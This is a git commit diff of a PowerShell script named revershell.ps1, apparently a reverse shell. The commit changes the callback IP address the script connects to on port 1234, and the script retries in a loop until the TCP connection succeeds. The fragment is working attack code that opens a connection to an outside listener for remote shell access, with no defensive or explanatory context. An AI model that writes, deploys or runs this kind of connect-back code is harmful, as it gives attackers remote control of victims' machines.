86fc2933c563a6eac0912833406c0295461f81a1
silvarye <61002139+silvarye@users.noreply.github.com>
2024-05-21 16:23:37 +0200

    Add files via upload

--- revershell.ps1
+++ revershell.ps1
@@ -1,7 +1,7 @@
 do {
     Start-Sleep -Seconds 1
     try{
-        $TCPClient = New-Object Net.Sockets.TCPClient('192.168.18.26', 1234)
+        $TCPClient = New-Object Net.Sockets.TCPClient('10.50.51.132', 1234)
     } catch {}
 } until ($TCPClient.Connected)
 
